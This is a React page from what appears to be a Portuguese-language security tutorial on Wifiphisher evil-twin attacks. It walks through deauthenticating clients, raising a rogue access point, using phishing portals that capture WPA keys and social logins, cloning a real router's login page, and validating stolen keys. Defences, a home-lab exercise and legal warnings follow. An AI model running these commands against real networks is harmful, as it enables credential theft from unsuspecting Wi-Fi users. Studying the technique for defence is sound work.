import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Wifiphisher() {
  return (
    <PageContainer
      title="Wifiphisher — Evil Twin + Phishing WiFi"
      subtitle="Sobe AP falso idêntico ao real, força clientes a se associarem e mostra captive portal de phishing."
      difficulty="intermediário"
      timeToRead="13 min"
      prompt="wireless/wifiphisher"
    >
      <h2>Como funciona</h2>
      <p>
        Em vez de tentar quebrar a senha (impossível em WPA2 com senha forte), o Wifiphisher:
      </p>
      <ol>
        <li>Faz <strong>deauth</strong> dos clientes do AP real.</li>
        <li>Sobe um AP falso (<strong>evil twin</strong>) com o MESMO ESSID.</li>
        <li>Cliente reconecta no AP falso (não tem senha — ele "cai").</li>
        <li>Toda navegação cai num <strong>captive portal</strong> (igual de hotel).</li>
        <li>O portal é phishing convincente: "Atualização do firmware", "Patch de segurança", "Reinsira a senha do WiFi".</li>
        <li>Cliente digita a senha → você captura.</li>
      </ol>

      <h2>Requisitos</h2>
      <CommandTable
        title="Hardware necessário"
        variations={[
          { cmd: "1 placa monitor mode", desc: "Para deauth do AP real.", output: "Alfa AWUS036NHA, TL-WN722N v1." },
          { cmd: "1 placa AP-mode", desc: "Para subir evil twin.", output: "Alfa AWUS036ACH, AWUS036NEH." },
          { cmd: "(opcional) 3a placa", desc: "Para internet upstream (NAT do alvo).", output: "Senão funciona offline." },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y wifiphisher",
            out: "(também pode-se git clone https://github.com/wifiphisher/wifiphisher)",
            outType: "muted",
          },
          {
            cmd: "wifiphisher --help | head -10",
            out: `usage: wifiphisher [-h] [-i INTERFACE] [-eI EXTENSIONSINTERFACE] [-aI APINTERFACE] [-iI INTERNETINTERFACE]
                   [-pK PRESHAREDKEY] [-hC HANDSHAKE_CAPTURE] [-dE DEAUTH_ESSID]
                   [--essid ESSID] [-eAP] [-pE PHISHINGSCENARIO] [...]`,
            outType: "info",
          },
        ]}
      />

      <h2>Cenários de phishing prontos</h2>
      <CommandTable
        title="--phishingscenario / -p"
        variations={[
          { cmd: "firmware-upgrade", desc: "'Roteador requer atualização. Reinsira sua chave WPA.'", output: "Funciona 99% das vezes." },
          { cmd: "oauth-login", desc: "'Faça login com Google/Facebook para acessar WiFi grátis.'", output: "Captura cred social." },
          { cmd: "wifi_connect", desc: "'A rede precisa de reautenticação.'", output: "Captura senha WPA." },
          { cmd: "plugin_update", desc: "'Update obrigatório do navegador.'", output: "Pode entregar payload." },
          { cmd: "captive_portal", desc: "Genérico de hotel/cafeteria.", output: "Boa para alvos públicos." },
        ]}
      />

      <h2>Ataque típico — firmware-upgrade</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade",
            out: `[*] Starting Wifiphisher 1.4 ( https://wifiphisher.org ) at 2026-04-03 16:42

[+] Selecting wfphshr-wlan0 interface for the deauthentication attack
[+] Selecting wlan1 interface for creating the rogue Access Point
[+] Changing wlan1 MAC addr (BSSID) to 00:00:00:42:42:42
[+] Changing wfphshr-wlan0 MAC addr (BSSID) to 00:00:00:99:99:99

[+] Sending SIGKILL to wpa_supplicant
[+] Sending SIGKILL to NetworkManager

ESSID                  ENCRYPTION  POWER  CHANNEL  CLIENTS
HomeWifi               WPA/WPA2    -31    6        1
Vivo-2024              WPA/WPA2    -52    11       0
CompanyAP              WPA3/SAE    -67    1        0

[+] Choose the [num] of the AP you wish to copy: 1

[*] Starting the fake access point on channel 6 with ESSID "HomeWifi"
[*] Starting the deauth attack against AP 24:5E:BE:1A:2C:01

[+] Cliente AA:11:22:33:44:55 conectou ao evil twin
[+] DHCP ACK enviado, cliente recebeu IP 10.0.0.42

[*] HTTP request: GET / from 10.0.0.42
[*] Redirecionando para http://10.0.0.1/firmware-upgrade

[!] CREDS CAPTURED:
    SSID:     HomeWifi
    PSK:      Senha@2024
    Source:   firmware-upgrade.html (10.0.0.42)`,
            outType: "error",
          },
        ]}
      />

      <h2>Anatomia do template</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "ls /usr/share/wifiphisher/phishing-pages/",
            out: `firmware-upgrade/    oauth-login/    plugin_update/    wifi_connect/    captive_portal/`,
            outType: "info",
          },
          {
            cmd: "tree /usr/share/wifiphisher/phishing-pages/firmware-upgrade -L 2",
            out: `firmware-upgrade/
├── config.ini
└── html/
    ├── index.html
    ├── login.html
    ├── static/
    │   ├── jquery.min.js
    │   └── style.css
    └── upgrade.html`,
            outType: "default",
          },
          {
            cmd: "cat /usr/share/wifiphisher/phishing-pages/firmware-upgrade/config.ini",
            out: `[info]
Name: Firmware Upgrade Page
Description: A router configuration page without logos or brands asking for WPA/WPA2 password
PayloadPath: /upgrade.bin
Version: 2

[context]
target_ap_vendor: Linksys
target_ap_logo_path: static/logo.png

[extra]
get_ssid: True
captures_credentials: True`,
            outType: "muted",
          },
        ]}
      />

      <h2>Customizar — clonar visual de roteador específico</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) baixar a página real do roteador alvo (modelo Vivo, TP-Link, etc.)",
            cmd: "wget --mirror -E -k -p http://192.168.0.1/login.html -P /tmp/router-clone",
            out: "(salva HTML+CSS+imagens da pagina admin do roteador real)",
            outType: "info",
          },
          {
            cmd: "cp -r /usr/share/wifiphisher/phishing-pages/firmware-upgrade /usr/share/wifiphisher/phishing-pages/vivo-update",
            out: "",
            outType: "muted",
          },
          {
            comment: "2) substituir HTML pelo do roteador real",
            cmd: "cp /tmp/router-clone/login.html /usr/share/wifiphisher/phishing-pages/vivo-update/html/index.html",
            out: "(silencioso. agora visualmente é IDÊNTICO ao roteador da Vivo)",
            outType: "default",
          },
          {
            comment: "3) editar config.ini para captura",
            cmd: "nano /usr/share/wifiphisher/phishing-pages/vivo-update/config.ini",
            out: "(definir Name, Description, ApVendor)",
            outType: "muted",
          },
          {
            cmd: "sudo wifiphisher -p vivo-update",
            out: "(usa o template clonado)",
            outType: "warning",
          },
        ]}
      />

      <h2>WPS / handshake captura ao mesmo tempo</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "validar a senha capturada contra handshake real (evita digitação errada)",
            cmd: "sudo wifiphisher --essid 'HomeWifi' --handshake-capture handshake-01.cap -p firmware-upgrade",
            out: `[*] Wifiphisher will deauth + bring up evil twin
[*] When user submits PSK, validate against captured handshake
[+] Cliente submeteu: 'Senha@2024'
[+] Verificando contra handshake...
[+] PSK VÁLIDA — credencial confirmada`,
            outType: "success",
          },
        ]}
      />

      <h2>Defesa</h2>
      <CodeBlock
        language="bash"
        title="proteções contra evil twin"
        code={`# 1. WPA3 SAE — bloqueia evil twin (autenticação mútua)
# Configure roteador para WPA3 only

# 2. 802.11w (Management Frame Protection)
# Configura no roteador (PMF: Required)
# bloqueia deauth não autenticado

# 3. Cliente: VPN obrigatório
# mesmo se cair em evil twin, tráfego cifrado de ponta a ponta

# 4. Cliente: NÃO digite senha em popup que aparece "do nada"
# treinamento de awareness

# 5. Detecção: Kismet + alertas em mudança de BSSID/canal do mesmo ESSID
sudo kismet -c wlan0mon
# alertas em SSID duplicado com BSSID diferente`}
      />

      <PracticeBox
        title="Lab pessoal — só com seu próprio WiFi"
        goal="Subir evil twin do seu próprio roteador (com seu smartphone como vítima) para ENTENDER a técnica."
        steps={[
          "Tenha 2 placas WiFi USB.",
          "Configure ambiente: airmon-ng start em ambas.",
          "Rode wifiphisher com -p firmware-upgrade.",
          "Selecione SEU AP no menu.",
          "Veja o seu smartphone DESCONECTAR e cair no portal.",
          "Digite a senha real (ou qualquer coisa).",
          "Veja a senha aparecer no terminal do atacante.",
          "Pare o ataque (Ctrl+C) → networkManager volta.",
        ]}
        command={`# Confira que tem 2 placas
iw dev | grep Interface

sudo airmon-ng check kill
sudo wifiphisher -aI wlan1 -eI wlan0 -p firmware-upgrade
# selecione seu AP no menu interativo
# observe smartphone caindo no portal`}
        expected={`[+] Cliente <seu_smartphone_MAC> conectou ao evil twin
[+] HTTP request: GET / from 10.0.0.X
[!] CREDS CAPTURED:
    SSID: <seu_AP>
    PSK:  <oque_voce_digitou>`}
        verify="Após o experimento, restart NetworkManager: sudo systemctl restart NetworkManager."
      />

      <AlertBox type="danger" title="Engenharia social funciona melhor que cripto">
        Wifiphisher prova que um humano cansado clica e digita em qualquer coisa que pareça legítima.
        Por isso o vetor #1 de comprometimento corporativo continua sendo phishing —
        nenhuma criptografia no mundo protege contra um usuário que voluntariamente entrega a senha.
      </AlertBox>

      <AlertBox type="danger" title="Em rede que não é sua = crime grave">
        Subir evil twin contra rede de terceiros é fraude eletrônica + interceptação +
        acesso não autorizado. Crime federal em quase todo lugar. Use só na sua rede,
        ambiente fechado de lab ou com contrato de red team.
      </AlertBox>
    </PageContainer>
  );
}
